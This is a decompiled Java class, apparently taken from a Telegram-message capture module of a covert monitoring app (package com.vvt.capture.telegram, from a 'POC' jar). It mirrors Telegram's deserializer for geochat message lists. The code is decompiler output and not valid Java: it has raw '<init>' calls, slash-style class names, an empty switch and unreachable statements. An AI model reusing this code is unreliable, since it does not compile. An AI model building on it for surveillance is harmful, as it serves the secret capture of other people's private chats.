package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$geochats_Messages
  extends TLObject
{
  public ArrayList chats;
  public int count;
  public ArrayList messages;
  public ArrayList users;
  
  public TLRPC$geochats_Messages()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.messages = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.chats = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static geochats_Messages TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in geochats_Messages", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_geochats_messagesSlice;
      ((TLRPC.TL_geochats_messagesSlice)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_geochats_messages;
      ((TLRPC.TL_geochats_messages)localObject).<init>();
    }
    if (localObject != null) {
      ((geochats_Messages)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (geochats_Messages)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$geochats_Messages.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */